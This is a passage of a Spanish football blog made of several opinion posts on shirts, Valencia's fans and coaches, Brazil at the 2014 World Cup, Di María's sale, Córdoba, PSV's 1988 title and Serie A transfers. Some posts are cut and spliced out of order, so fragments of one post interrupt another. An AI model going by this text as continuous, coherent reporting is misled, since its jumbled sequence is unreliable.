con el violeta que vistió a Batistuta. Y ahora, a diario en Málaga, donde me he venido a vivir, el desfile de Umbro, Li-Ning, Nike y hasta Kelme. Del azul marino al celeste del firmamento, mezclado con el blanco de sus casas más antiguas. Una camiseta de pasado que este verano se ha cargado de futuro.Estos días he estado algo alejado del fútbol. Las mudanzas son agujeros negros que absorben la energía que los rodea. Es difícil disfrutar del fútbol con cajas de cartón acechándote en cada esquina. Aún así saqué tiempo para ver la final de la Champions. No puede salir un equipo que pretende ganar el máximo trofeo continental con esa camiseta descafeinada que Nike diseñó para el Manchester. Hay camisetas y camisetas. Tras ese baño de purpurina dorada, más cercano al bailón de discoteca que al fútbol, o la asimétrica barcelonada catarí, no podemos hacer otra cosa que volver a los clásicos. A los oldies but goldies. Salvo excepciones contadísimas, estamos viviendo una época difícil en el diseño de camisetas. Marcas que han errado el tiro, que sólo tienen ojitos para los adolescentes de la ESO y que olvidan a los treintañeros fondones pero fieles, a los que preferimos la sobriedad vintage que esa amalgama fluorescente y entallada, a esa modernidad de parkour que lo mismo sienta bien a un concursante de Fama que a un pandillero con cadenas de oro cayendo sobre el escudo.Uno envejece y se vuelve más delicado. O más exigente. O directamente un estúpido. Pero es imposible perdonarle a Adidas el cambio de logo, es imposible perdonarle a Holanda que se travistiera con Nike, es imposible perdonarle a Adidas que disfrace al Madrid de lo que nunca fue, un club de horteras depilados. Iba a hablar de camisetas pero he terminado hablando de mí. De mí a través de las camisetas. Buena cosa. Mirad vuestros armarios, abrid el maletero del coche donde amontonáis camisetas que ya no caben en casa -hechos verídicos-. Toda esa ropa es parte de vosotros. A lo mejor veneráis escudos que jamás habéis visto sobre el césped. Recuerdo estar en casa de Sergio Cortina y dedicar cinco minutos a ver sus camisetas, como dos niños que se enseñan los cromos, como dos madres embelesadas que tocan con la yema de los dedos el tejido de la prenda, como dos amigos que se envidian sanamente. Hay tantas cosas en las camisetas que coleccionamos, en las elásticas que regalamos, que hoy, en esta vuelta al blog, no he podido hablar de otra cosa. Los colores son parte del fútbol. Marcas y escudos. Ropa que nunca nos pondremos pero que doblamos litúrgicamente sobre la cama, que acomodamos con suavidad en los cajones repletos. Mestalla tiene fama de estadio exigente. Desde lejos, sin conocer los intestinos del club ché, siempre he tenido la sensación de que los aficionados nunca están satisfechos del todo. Existe cierta urgencia por mantener un estatus privilegiado, el de alternativa al poder omnímodo de Madrid y Barça, tanto en la competición doméstica como en las meritorias incursiones europeas. Ser el tercer equipo de España, una vez superado el boom del Sevilla y el abono a la irregularidad del Atleti, sólo está en sus manos en dura pugna con el vecino Villarreal. No digo que de ahí vengan los motivos de su inquietud, pero es palpable que a poco que el equipo zozobre o divague, la grada se activa con pitadas, abandonos precipitados o inflamadas críticas en prensa.Emery ha sido en muchas ocasiones el objetivo de esos desaires.Estuve una temporada sin marcar, pero eso no significa que a mí no me gustara jugar para Francia. Me gusta mucho jugar para Francia‘. Karim se excusa porque hay quien, lanzando piedras sobre el tejado del mismísimo Elíseo, pasa lista a la hora de entonar ‘La Marsellesa‘. Tú sí, tú eres un buen ciudadano francés; tú no, tú no mereces jugar con la camiseta nacional. El asunto no es nuevo. Francia va ya por la cuarta generación de futbolistas de origen colonial que juegan para el combinado del gallo. Tan franceses para el balón como los nacidos en Toulouse o en Lyon. La primera generación, la pionera en un mundo que parecía no estar hecho para ellos, ya falleció, ley de vida. La segunda llegó a alcanzar la capitanía Bleu de la mano de Marius Trésor. Y la tercera, inolvidable, representada por Zidane, Karembeu, Thuram o Vieira elevó a Francia a los altares, al conquistar el Mundial y la Eurocopa de forma consecutiva. Comprobar requisitos de lealtad a la República, pasar revista a las tropas a la hora de hinchar el pecho para dar la acogida al Jour de gloire a estas alturas de la película suena improcedente.Francia, la nueva Francia, busca un líder y Benzema se postula. Con actuaciones como la firmada el pasado domingo ante Honduras, en el debut mundialista de los galos, las dudas sobre su procedencia, su implicación y, en definitiva, su françaisisme se disipan. Deschamps sonríe. No puede hacer otra cosa. Brasil conseguía en la tarde del sábado superar el primer escollo serio en su camino hacia esa final que todo el mundo, de un modo u otro, espera o prevé. Fue duro, quizá más incluso que lo previsto por aquellos que han juzgado más severamente el juego brasileño en lo que llevamos de torneo. La selección de Scolari experimentó lo que es vivir bajo la dictadura del miedo cuando, tras igualar Alexis Sánchez el gol inicial que adelantaba a Brasil, el partido tomó un notable tono rojizo. Fue durante toda la segunda mitad cuando el combinado anfitrión coqueteó con el desastre nacional ante una Chile valiente, fiel a su papel y convencida de que la historia del torneo aún está por escribir. Desapareció Neymar, notable a lo largo de todo el campeonato pero sospechosamente escondido cuando el miedo comenzó a hacer acto de presencia. Desaparecieron por supuesto Fred y, posteriormente, Jô, que son dos futbolistas que suscitan el debate continuo sobre la idoneidad de su presencia en el once de la canarinha. Y desapareció, porque realmente no ha llegado a hacer acto de presencia en los cuatro partidos que hasta la fecha llevan disputados los de Felipão, el fútbol que se le presupone a un aspirante a campeón mundial.El naufragio brasileño, salvado únicamente por la deficiente actuación chilena desde los once metros, no fue sino el resultado lógico a sus carencias, a las mismas que se le han venido señalando desde hace dos semanas y que Scolari no solo no ha podido disimular ni contrarrestar, sino que no parece demasiado preocupado por poder hacerlo. Esta Brasil que aspira a su Mundial sin un punto medio de conformidad parece confiada a la emotividad de la cita para llegar a lo más alto. Como si hubiese cedido todo el protagonismo a la pasión y hubiese olvidado que eso que rueda sobre el verde exige una mayor atención que la que hasta ahora se le ha prestado.La Brasil que comanda Neymar con una pasmosa naturalidad juega siempre al límite de las emociones. Lloran y abrazan una especie de éxtasis místico cuando braman eso del ‘Terra adorada entre outras mil és tu, Brasil, ó pátria amada‘. Y a partir de ahí, con el corazón sometiendo a la cabeza, disputan un partido bajo un ritmo emocional prácticamente insostenible. Llaman a la grada, se excitan en cada lance cotidiano del juego alentados desde su propio banquillo y llevan el duelo al plano de la visceralidad extrema sin posibilidad de retorno. Y todo parece una consigna evidente de su técnico, empeñado en sostener el partido sobre el umbral lógico de frecuencia cardíaca con una continua batalla, tanto dialéctica como gestual, planteada desde su área técnica. Ante la ausencia de fútbol, futbolistas en trance.El equipo hiperemocional de Scolari tira de pasión para llegar hasta donde no llega su juego.Pero encierra un delicado peligro, siempre latente. No es sencillo gestionar el devenir de un partido definitivo, de un choque eliminatorio, con el estómago encogido por la tensión. Si el resultado acompaña, si la comunión con la grada no se quiebra y si el desarrollo del encuentro no se pone caprichoso, la emotividad funciona. Si, por el contrario, el partido no avanza por donde la canarinha prevé, si las cosas no salen, si la grada se impacienta y comienza a señalar camisetas, entonces el equilibrio se rompe y la ecuación empieza a poblarse de incógnitas. Uno espera otra cosa de la selección pentacampeona del mundo y gran favorita a reeditar la gloria. Tengo la sensación de que, en los posibles tres encuentros que restarían aún a una hipotética Brasil campeona del mundo, vamos a vivir episodios en los que la teatralización del juego y la visceralidad del combinado de Scolari va a terminar jugando en contra de los intereses de la Seleção. Tal es el pánico a la derrota y el fracaso. Hoy han librado por poco y la performance brasileira ha vivido una apoteosis final repleta de rezos, plegarias y lágrimas que ofrece pocas dudas sobre el camino que continuará marcando Scolari. Mi amigo Ricardo es un fanático de los coches. Le gustan todos, desde un clásico trufado de cromados hasta el último modelo de utilitario y, si por él fuere, tendría una flotilla en el garaje en seria competencia con la del mismísimo Samuel Eto’o. Pero, por desgracia para él, Ricardo tiene un nivel económico medio. Hace un par de semanas, sabiendo también de mi predilección por el mundillo del automóvil, me comentó una posibilidad que le había surgido. ‘Un caprichito irrechazable’, en sus propias palabras. A Ricardo le habían ofrecido un Porsche Boxster, con apenas seis años y algo menos de cien mil kilómetros, por apenas ocho mil euros. ‘Un chollo a mi alcance’, me decía mientras se le iluminaban los ojos como a un niño. La operación era, desde el punto de vista económico, redonda, porque además se trata de un coche con muy buena salida en el mercado de ocasión.Sin embargo, Ricardo, dejándose llevar por la cercanía de su sueño, no había contado con sus circunstancias familiares y personales. Con su mujer en el paro, un hijo de tres años y otro que viene en camino, la utilidad de un deportivo en su garaje quedaba considerablemente en entredicho. No hablamos ya del consumo medio del coche ni de su mantenimiento, sino del servicio que un vehículo biplaza y con una reducidísima capacidad de carga podía ofrecer a una familia como la suya. Desde un punto de vista meramente práctico, arrinconar el viejo pero fiable Peugeot familiar y su versatilidad sin competencia para hacer sitio en el garaje al capricho del Porsche era una operación aberrante, y así se lo hicimos saber sus amigos más cercanos. Por mucho que, económicamente, supusiera un negociete idóneo.Una operación muy similar, salvando las lógicas distancias, ha terminado menoscabando el potencial deportivo del Real Madrid. Ángel Di María, un futbolista de una bellísima imperfección y con un don especial para aparecer en escenarios angustiosos, parece ser ya historia en Chamartín. La llegada del colombiano James había colocado al argentino, pese a su notable Mundial y a haber sido uno de los futbolistas clave en el primer año de Carlo Ancelotti en Concha Espina, en la puerta de salida y con las maletas facturadas esperando el embarque.Su salida con destino Old Trafford parece ya un hecho (confirmado por su propio técnico), y si atendemos al montante económico de la operación pocos peros pueden ponerse al traspaso del Fideo. Pero, como parece haber hecho buena parte de la afición madridista, hay que tomar en cuenta otros factores para poder valorar el negocio debidamente. Sustituir a un futbolista hecho, perfectamente acoplado al sistema y a la dinámica del club y, sobre todo, que ofrece una versatilidad y una multitud de soluciones tácticas a su entrenador, por un jugador aún por contrastar en una gran liga implica unos riesgos que tal vez no hubiese sido necesario asumir. Deportivamente, el riesgo que se corre al tocar lo que funciona con el cambio de Di María por James es más que evidente. Por mucho que el colombiano, extraordinario pelotero de ensueño, fuese un caprichito irrechazable. Quién lo iba a decir. El Atlético que visitó el Santiago Bernabéu en la ida de las semifinales de la Copa del Rey fue el más alejado al Atlético que Simeone nos tiene acostumbrados a ver. El 3-0 final del marcador no deja lugar a las dudas. Justo cuando más firme parecía el cuadro colchonero, cuando había conseguido encaramarse al liderato de la Liga y desplazar de ese puesto de privilegio a cualquier posible compañero de viaje, el Atleti decidió representar un revival sobre el césped del Paseo de la Castellana. Una vuelta a sus más oscuros precedentes, a tiempos pasados que el aficionado colchonero creía haber olvidado ya para siempre. Al Atleti de anoche se le escapó la fuerza por no se sabe dónde. Ni Godín ni Miranda sujetaron, ni Koke ni Arda brillaron en la medular, ni Costa percutió con efectividad (a la portería, nos referimos). Desprovistos de sus principales virtudes, los rojiblancos se mostraron como un equipo ramplón, uno de los tantos que visitan el feudo blanco y acaban manejados como una marioneta al son de un rival que termina aplastando por su propio peso.Al Madrid le bastó, de inicio, con anular psicológicamente a Diego Costa. Los primeros 30 minutos del choque fueron un completo muestrario de herramientas de desquicie hacia el hispano-brasileño. Empujones, charlas, pisotones con el balón fuera de ojo… Todo por sacar de órbita al delantero rojiblanco. Tan lícito como peligroso. Costa, que de matonismo entiende un rato, aguantó el reto pero se perdió en la disputa: no inquietó ni una sola vez la meta de Casillas.Sorprende que, anulado Costa, el Atleti no supiera sacar a relucir ningún plan B. Como si su único discurso fuera esa máxima simeonesca tan manida de ‘ir al límite’. En lugar de eso, se limitó a intentar mantenerse en pie ante el implacable zarandeo madridista. Había ganas de revancha, de lavar las dos recientes afrentas (la final de Copa del pasado curso y el partido de Liga de la primera vuelta) sufridas en feudo propio. Y ahí creció colosal Ángel Di María. Olvidado ya el episodio del acomodo de merienda, el extremo argentino ha reiniciado su ordenador de a bordo para amoldarse al rol que Ancelotti le encomienda en el 4-3-3 del italiano. De incisivo y vertiginoso futbolista de banda a concienzudo trabajador interior. Lo bueno para el equipo, es que, por mucho que haya variado su registro de origen, Di María no ha perdido ni el gol, ni su capacidad de desborde, ni su instinto para filtrar balones (¡el gol de Jesé!) . Habrá quien recuerde que, para esa misión, el Madrid ya contaba con un especialista hasta el pasado mes de septiembre. La reconversión de Di María es, de los males, el menos malo.Sobre Jesé ya hablamos en profundidad hace algunas semanas. Su crecimiento se ha visto claramente beneficiado por el ostracismo obligado, y de causa real desconocida, de Gareth Bale.Tiene una personalidad controvertida, exigente, protector con los jugadores y a su vez desafiante. Un perfil que causa cierta inquietud en el aficionado. Se le acusa de irregular, de conservador en su juego, y de no haber mantenido al equipo enchufado en momentos claves de la temporada. A su favor creo que juega una trayectoria de llano, sin muchas cimas pero con una constancia que ha logrado mantener al Valencia en la élite de nuestro fútbol, pese al maremágnum institucional reciente. Ni la marcha de dos iconos como Villa y Silva han logrado hundir a un equipo que ha empezado muy fuerte en la liga. Fichajes de perfil bajo, lejos del relumbrón de los rivales, que han sabido amoldarse y competir en un torneo difícil. Sólo hay un pero en este comienzo, la dubitativa presencia en la Champions. Esta noche, ante el Glasgow Rangers, tendrá oportunidad Unai Emery de sobreponerse a las críticas que vuelven a aflorar en el ambiente naranja.La derrota ante el Manchester, tras un partido meritorio y con alternativas de ambos bandos, marcó la cuesta abajo en la máxima competición europea. Tras la goleada al Bursaspor la fase de liguilla se prometía felicísima para el club valencianista. Su objetivo, tras volver a la Champions, era pasar de ronda. Había dudas sobre el equipo pero el rendimiento de Aduriz, Pablo Hernández o el paralotodo César habían disparado la ilusión entre los parroquianos. De esa derrota en casa vino el empate intrascendente en Ibrox Park, un equipo blando ante el empuje del Rangers, con más oficio que talento como dice el tópico, pero que cobra todo sentido viendo como se plantaron frente a su portero aún jugando de locales.El grupo está apretado y un nuevo tropiezo en casa puede complicar la clasificación a los valencianistas, que aún dando por logrados los tres puntos en casa ante los turcos, deberían jugarse el todo por el todo en Old Trafford ante los hombres de Ferguson. Esta es la primera final de la temporada. Perder marcaría una tendencia negativa viendo las expectativas que este año vuelven a depositar los aficionados en el club ché. El crédito de Emery, siempre bajo mínimos, podría casi desaparecer con este precipitado adiós a la Champions. El equipo escocés no tiene nada que perder con cinco puntos en su casillero, un empate sería una bendición en Mestalla. De la incisión de Aduriz y Soldado y la labor creativa de Mata depende la victoria en un partido tan valioso como comprometido y prematuro. Si el corazón falla hay que parar. Sergio Sánchez ha pasado un año viviendo entre el dolor y la esperanza, entre la luz y las tinieblas. Su afección cardiaca tuvo una consecuencia instantánea, no volvería a jugar al fútbol. En el camino se quedaron Puerta y Jarque, alejados para siempre del césped De la Red o Miguel García. Para el defensa catalán la noticia era demoledora y ni siquiera la alegría de haber diagnosticado su enfermedad a tiempo, antes de desenlaces fatales, pudieron quitar al jugador las ganas de regresar. La salud es lo primero, dicen, pero patear el balón es un ritual que no se puede abandonar de la noche a la mañana.La operación en Hamburgo era delicada y no había garantías de éxito. Los noventa minutos de ayer sobre el césped del Ramón Sánchez Pizjuán confirmaron que fue una decisión acertada. No es habitual ver el camino inverso desde la oscuridad hasta el brillo de los focos de un estadio, tal vez el recuerdo de Kanu. Sólo el trabajo y la confianza, según el propio Sergio, han obrado este milagro deportivo. Ayer, ante el Villarreal, la noticia fue su vuelta. Deseo que este año sólo haya sido un punto y seguido en la carrera de un futbolista que ejemplifica la pasión por este deporte.Ganó el Sevilla, tres a cero al desdibujado equipo de Garrido. Están en semifinales por tercer año consecutivo. Apartan los fantasmas de la liga con una competición que ya ganaron el año pasado y que siempre luce en las vitrinas de un club. Sin embargo, el mayor éxito del club nervionense ayer fue haber llevado con inteligencia y cariño el caso de Sergio Sánchez. Los finales felices, a veces tan escasos, siempre son bienvenidos. El mundo del fútbol da de nuevo, y de forma definitiva, la bienvenida al joven futbolista de Mataró. Si algo nos enseñó la vida es que todo lo bueno se acaba. Desde el trozo de pastel a la infancia, desde la felicidad a la serie de tu vida, siempre hay un final. Para el Córdoba acabó anoche también una racha ilusionante. El partido contra el Madrid de la pasada semana era una derrota asumible, y más tras el magnífico juego realizado, pero ayer frente al Celta se volvieron a ver las costuras de un equipo que no termina de encontrar su sitio en Primera División.El Celta tiene velocidad arriba, dos jugadores de zona alta como Orellana y Nolito, y un incordio como Krohn-Dehli que se echa al equipo a las espaldas y no desfallece ni un solo minuto durante el tiempo reglamentario. La defensa gallega, algo mermada, apenas tuvo que esforzarse para contrarrestar el ataque blanquiverde. Una vanguardia que ayer sólo fue sumatorio de nombres, que en la práctica fue como disparar balas de fogueo, como esas discusiones de bar en las que uno grita “te voy a dar” pero termina yéndose con la cabeza agachada y murmurando insultos.El gol de Nolito, imparable el tiro pero demasiadas comodidades cortesía de Gunino, terminó por dinamitar el escuálido sistema de Djukic. Que un central reconvertido, Deivid, y Rossi no pueden sostener a un equipo se supo desde el minuto cinco de partido. Bebé y Ghilas son eléctricos arriba pero perezosos defendiendo. Andone era una isla. Y el experimento Heldon salío como se podría esperar: perdido e intrascendente en su precipitado debut con su nuevo equipo.Ni el cambio de Abel en el descanso pudo parar la sangría. El equipo estaba partido en dos. El resultón 4-2-4 de Djukic es agradable de ver y funciona precioso cuando el rival deja jugar al contrario y renuncia a la pelota –como aquel Granada de Caparrós-. Pero en el momento en el que los futbolistas de enfrente se lanzan al ataque el esquema se rompe como una cera en la mano de un niño. En dos, por la mitad, con dos bloques independientes que sufren por separado. Ayer se vio que las funciones de Cartabia –ausente por sanción- eran algo más que el regate estéril. El argentino tiene un pie en el centro y otro en el área enemiga. Da oxígeno al balón, se balancea como se le pide a los buenos jugadores, hace de pegamento rápido.Cordero, el director deportivo del Córdoba, ha fichado en ese sentido. Krhin y Zuculini vienen a darle músculo y talento a un centro del campo anémico y desbordado. Sin lateral derecho, Gunino no se termina de asentar y Campabadal no tiene confianza ninguna, quizá es momento de que Crespo vuelva a la banda e Iñigo López entre en la rutina del equipo de nuevo. Con los fichajes nuevos se podrá ver un mediocentro más asentado, intuyo que Krhin, Zuculini y Rossi se simultanearán. Arriba entrará Cartabia en un lado, Bebé en el otro y Ghilas asumirá de nuevo la punta de ataque.El rumano Andone es una irrupción ilusionante pero ayer se volvió a ver que por sí mismo no crea peligro, necesita a un equipo jugando para él y no desatasca el juego cuando los suyos no están finos. El argelino es otra cosa. El gol contra el Athletic en San Mamés es una buena forma de entender lo que digo. Ayer dio mucho pena verlo vagar por la banda, desquiciado y ajeno a la mecánica del resto.Es increíble, tras el partido de ayer, que el Celta esté sufriendo tanto esta temporada. Tiene aplomo y experiencia y calidad suficiente como para no tener que andar mendigando puntos. Un bache de diez partidos que ayer se espantó, parece, a costa de un Córdoba bisoño y descontrolado.Partido para olvidar para el Córdoba. Por su juego y por esa obra cómica que protagonizaron Teixeira y su asistente.Ayer volvió a dejar claro que, al contrario que un Morata que cada vez que pisa el césped deja mayor sensación de dispersión, el atacante canario no tiene intención de abandonar su misión. El chollo del pasado verano, por lo visto hasta la fecha y el rendimiento ofrecido, estaba en la cantera blanca. La siempre crítica grada de Mestalla dio a Nuno Espírito Santo su primer aviso serio en el partido del pasado sábado en el que el Valencia CF empató sin goles ante el Betis. Fue una pitada prácticamente unánime, tensa, de esas que acaban situando a la afición valencianista en el disparadero. De esas que, a ojos del resto de aficiones de España, terminan de ayudar a definir el establecido prejuicio que coloca a la hinchada ché el cartel de caprichosa, exigente, inestable e histérica. Nuno llegó a Mestalla siendo una absoluta incógnita. La gente, que sin duda esperaba un entrenador con mayores credenciales, transigió con su fichaje porque entendió que era parte de una nueva era. De una era en la que, con el club debidamente saneado en lo económico, el valencianismo debía de confiar y ponerse en las manos de lo que Peter Lim tenía en mente. Cuando los buenos resultados deportivos acompañaron, lo institucional quedó en un discreto segundo plano y la incógnita de Nuno comenzó a despejarse. Se hacía y se deshacía. Se fichaba, se vendía. Se largaba a Rufete y Amadeo Salvo. Pero la pelota entraba y allí no pasaba nada, todo se perdonaba. Todo parecía seguir girando bajo el músculo económico de Mister Lim.Pero, sea como fuere, la pelota ha dejado de entrar. Al menos, ha dejado de hacerlo con tanta asiduidad como lo hacía hace solo unos pocos meses. Ya no la empuja in extremis Paco Alcácer. Ya no llega Feghouli a ese balón que se marcha. Ya no domina Parejo con la solvencia de otros momentos. Con Lim apostado y protegido tras las sombras más impenetrables y Jorge Mendes manteniéndose completamente ajeno a lo que ocurre sobre el césped, el triángulo formado por el magnate singapurense, el factótum portugués y el técnico ha comenzado a mostrar los primeros síntomas de fatiga en sus estructuras. No soy aficionado che y no puedo ponerme en la piel del que cada quince días toma su asiento en Mestalla y debe sobrellevar una situación institucional inusual y con aroma de inestabilidad. No puedo saber si los pitos de la grada surgen a raíz de una determinada decisión del banquillo, o si son fruto del descontento con alguna alineación comprometida. O tal vez los pitos a Nuno no fueran directamente dirigidos a Nuno, a quien le ha tocado jugar el ingrato rol de escudo humano de sus superiores. Tal vez la pitada fuera una muestra de descontento con una situación de incertidumbre a la que empiezan a vérsele las costuras. Tal vez fuera una pitada dirigida a la pertinaz y despreocupada ausencia de Lim o a las oscuras maniobras de Mendes, quien, una vez despejado el horizonte con la salida de Salvo, ve al Valencia expuesto como una gigantesca mesa de negociaciones. La afición ‘más exigente’ de España, esta vez sí, tiene motivos para pedir explicaciones. Aunque quizá el menos indicado para ofrecérselas sea precisamente Nuno. Como todas las grandes competiciones deportivas, la Copa de Europa, la clásica, esa que guardamos en el recuerdo como ‘copuropa‘ y en la que la variedad de equipos presidía las eliminatorias, es proclive a historias inolvidables y a episodios de leyenda. Y puede que el transcurso del tiempo haya magnificado sucesos como el del Steaua de Helmuth Duckadam en la final del Sánchez Pizjuán de 1986, el de los Lisbon Lions del Celtic en el 67 o el del hoy indescifrable doble título del Forest de Brian Clough. Sin embargo, ni siquiera el tiempo podría llegar a dar otra pátina más lustrosa al título que, inesperadamente, consiguió alzar el PSV Eindhoven de Guus Hiddink en 1988. Porque un invitado con el que nadie contaba se coló por la puerta trasera de una fiesta que estaba reservada a un equipo que encandilaba con su juego al continente y cuyo nombre había empezado a grabarse ya en la orejona. Aquella edición del torneo parecía encaminada a encumbrar al Real Madrid de la Quinta del Buitre, pero el equipo del sur de Holanda fue progresando, ronda a ronda y sin ganar un solo encuentro desde los octavos de final ante el débil Rapid de Viena, empate tras empate hasta plantarse en la final del Neckarstadion de Stuttgart, siempre apoyado en el valor doble de los goles anotados lejos de Eindhoven, tanto en Burdeos (en cuartos ante el Girondins) como en Madrid.Y fue por uno de esos solitarios y ruines goles en campo contrario como el equipo de Hiddink logró deshacerse del favorito. Era el partido de ida de la semifinal. Uno de esos encuentros que, en la ignorancia de mis diez años, sabía que había levantado enorme expectación en todo el país pero no alcanzaba a entender muy bien el porqué. Con todo dispuesto para dejar el camino de la final expedito ya en la cita del Bernabéu y con el camino abierto por el tempranero gol de Hugo Sánchez al batir a Hans van Breukelen desde el punto de penalti, Edward Linskens, centrocampista de corte defensivo que personificaba como pocos jugadores el gris opaco de aquel PSV, conseguía infiltrarse entre Camacho y Tendillo para sobrepasar a Buyo con un torpe remate a trompicones que acabaría significando el definitivo pase de los holandeses a la final. La vuelta en el Philips Stadion no dio de sí lo que el madridismo esperaba. Bajo una atmósfera asfixiante, Eric Gerets, Berry van Aerle, Willy van de Kherkof y, sobre todo, el mítico Hans van Breukelen se hicieron enormes en la misión defensiva para interponerse en la trayectoria de los sueños de una generación de madridistas que, desde aquella noche del empate a cero de Eindhoven, quedaría marcada para siempre.Ya en la final de Stuttgart, y ante el Benfica, el cuadro de Hiddink decidió seguir siendo fiel a sus principios. Cerocero durante los noventa minutos, una prórroga sufrida y de nuevo van Breukelen convirtiéndose en gigante para transformar su nombre en pura leyenda. Un penalti, tras completar la tanda sin fallos, para hundir al benfiquista António Veloso (padre de Miguel Veloso) y para encumbrar en ídolo al ogro holandés. A aquel que destrozó las ilusiones de un madridismo que aún tardaría otros diez años en recuperarse del susto.Han transcurrido más de veinticinco años desde el triunfo más importante de la historia de un PSV que aquel mismo año de 1988 se alzaría con el triplete (copa, liga y copa de Europa) y puede decirse que desde entonces el club de la Philips volvió a quedar sumido en un pesado letargo del que a duras penas podrá despertar en una Europa que ya no tiene sitio para los invitados no esperados. Ya nadie se acuerda de los de Eindhoven en la máxima competición continental de clubes y nadie parece echarles demasiado en falta. Piensen, sin embargo, en el nombre de cuatro o cinco futbolistas de aquel equipo campeón de finales de los años ochenta. Soren Lerby, Eric Gerets, Ronald Koeman, Hans van Breukelen, Gerald Vanenburg… Bien.Impropio de Primera División, un árbitro desbordado que no sabe que pitar, que se desdice, que permite que el club ofendido por su decisión le presione hasta en la cocina y que termina amonestando al capitán del Córdoba por vete tú a saber qué.Duelen estas decisiones, pero hoy no serán la excusa. No sé si el penalti fue o no fue –la repetición me genera dudas-, lo que es cierto es que se pitó y después se “despitó”. Aún así el problema del Córdoba es el mismo que hace unos meses: la defensa sufre mucho en los marcajes, el centro del campo no sabe dominar los partidos, la brillantez ofensiva es intermitente, y Djukic no parece tener soluciones –de momento- en el banquillo para revolucionar el partido cuando se pone a la contra. Sigue la hemorragia de puntos.Ayer los cordobesistas, frente a un Celta muy superior, se volvieron a dar cuenta de que quedarse en Primera costará lo suyo. Quedan dieciocho partidos y el cuchillo entre los dientes no sirve contra todos los rivales. Recuerdo a Zapater en una entrevista radiofónica explicando, tras una buena temporada, su paso del Genoa al Sporting de Lisboa. Venía a decir, casi literalmente, que lo de los fichajes en Italia es difícil de explicar, que si pueden hacer un negocio lo hacen, y que a veces no tenía que ver ni con el rendimiento ni con la oportunidad, dejaba entrever un capricho de los dirigentes en cerrar tratos cuanto antes. Lo explicaba con candidez, aunque puestos a ser mal pensados, y el Calcio nos obliga a serlo de alguna manera por los cuantiosos casos de marrullería institucional a los que nos tienen acostumbrados, podríamos deducir que debajo de cada acuerdo entre clubes se esconde algún interés espurio, soterrado, extrafutbolístico.Dejando a un lado la conspiración, como cada invierno, Italia se llena de altas y bajas, animando el congelado entusiasmo de unos clubes que demasiado a menudo bucean entre la irregularidad y el descalabro. Se lleva la palma el Milan, que prácticamente ha renovado el equipo en seis meses, y el Inter que, paradójicamente, echó a Benítez tras pedir el español más fichajes, y ahora contrata a un puñado de nuevos futbolistas para intentar remontar el vuelo. Genoa como siempre, Palermo o Juventus también han contribuido lo suyo para soliviantar a los fieles lectores de la Gazzeta.El AC Milan va líder de la Serie A y eso es algo que no debe dejarse escapar tan fácilmente. La irrupción de Ibrahimovic ha vuelto a traer la alegría a los rossoneri y Galliani ha cimentado el equipo en las zonas en las que cuanto menos tiritaba. La llegada de Cassano es una bendición para un equipo acostumbrado últimamente al trabajo y no a la estética. También se encierran atrás con el defenestrado Legrottaglie y el espanyolista Dídac Vila. Apuestan por la velocidad y versatilidad de Emmanuelson para cubrir una banda izquierda algo pobre y le dan galones a Van Bommel, este último si es un genuino fichaje milanista: maduro, leñero y experimentado.El Inter ha soltado algo de lastre deshaciendose de Mancini y Kerlon, y ha traído a esos cuatro jugadores que Benítez decía necesitar hace un par de meses. Rannochia y Kharja del Genoa, el lateral Nagatomo del Cesena y Pazzini de la Sampdoria. El delantero de Pescia ya ha debutado y demostrado lo acertado de su contratación. En el debut marcó dos goles y provocó un penalti frente al Palermo, más que suficiente para hacerse un hueco a la vera de Eto´o.La Roma ha movido poco la caja este invierno, sólo la salida de Baptista, Okaka o Cicinho pueden ilustrar el delicado estado del equipo de la capital. Lo de Borriello, Adriano y Simplicio en el mercado estival les ha valido para estar en puestos europeos en la liga doméstica y llegar a octavos de Champions frente a un Shakhtar Donetsk muy en forma.La Juventus no pasa su mejor momento pese al desembolso veraniego, Del Neri no da con la tecla para hacer moverse al equipo. Krasic ha irrumpido como una exhalación pero  la lesión de los delanteros titulares, incluido el reciente Toni, ha obligado a mover ficha. Matri, con once goles en lo que va de campeonato, ha sido el elegido. Cedido por el Cagliari con opción a compra. Por el contrario se han deshecho de Amauri, que no ha logrado brillar aún en el equipo bianconero y que pone rumbo a Parma. Para la defensa han contado con el experimentado Barzagli, que vuelve a Italia tras unos buenos años en Alemania.Nápoles y Lazio también ha jugueteado con los traspasos para cimentar sus brillantes posiciones en el Calcio. Los primeros han apostado por Mascara, un creador de juego que puede demostrar su calidad en un equipo puntero y el español Víctor Ruiz, puntal defensivo del Espanyol. La Lazio ha conseguido el fichaje del delantero Sculli del Genoa, para acompañar a Kozak sólo un paso por delante de Hermanes.Maccarone a la Sampdoria, Paolucci al Palermo, Modesto al Parma o la promesa uruguaya Ceppelini al Cagliari son otras muestras del trasiego en las oficinas italianas. ¿Qué fichajes os han llamado la atención en este periodo? ¿Cuáles creéis que son los aciertos o desaciertos viendo lo sucedido? Ayer, en una de esas noches de radio, cuando el sueño no termina de llegar y nos dejamos atrapar por los programas deportivos, escuché al guardameta Cobeño explicar la situación de su equipo. No diré que me emocionó, siempre miro los problemas económicos de los futbolistas profesionales con cierta distancia, pero me hizo darle vueltas a la situación del fútbol como negocio. En esa extraña mezcla de aficionados, espectáculo y pura especulación inversora. Esto es más antiguo que el propio deporte, claro, y el caso del Rayo Vallecano se ha visto en otros equipos con una particularidad: los vallecanos son líderes de su categoría y tras su reciente victoria ante el Betis tienen todas consigo para subir, por fin, a Primera División.La familia Ruiz Mateos lleva meses sin pagar a la plantilla y sólo una venta del club, inmediata además, puede solventar el problema de los pagos. Inyectando dinero antes, si es posible, para aliviar la situación de los afectados.Ahora, hagan lo propio con la actual plantilla del equipo. La respuesta, si usted ha nacido antes de 1980 y presume de ser un buen aficionado al fútbol, será contundente.Puedes comprar camisetas del PSV Eindhoven en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Y, si decides no mirar la cuenta de tu tarjeta a final de mes, piensa en aquella hummel con Parmalat y date el capricho de revivir tus sueños infantiles. Leo Messi. Rotura del ligamento lateral interno de la rodilla derecha. Que el argentino se lesione siempre es noticia, primero porque continua siendo el futbolista más decisivo del campeonato liguero y del mundo y, segundo, porque es felizmente infrecuente que el rosarino caiga en acto de servicio. Un choque con Pedro Bigas mantendrá a Leo alrededor de dos meses alejado del césped. Su baja, que se acumula a las que ya arrastra el Barça, es una prueba de fuego para Luis Enrique, que deberá afrontar al menos tres partidos de Liga de Campeones y media docena de encuentros ligueros sin su pieza más resolutiva. Sin aquel que es capaz por sí solo de sacar al Barça de cualquier atolladero en el que se vea encerrado.Carlos Kameni. Que el Real Madrid acabe un partido sin conseguir anotar un gol entra dentro de lo 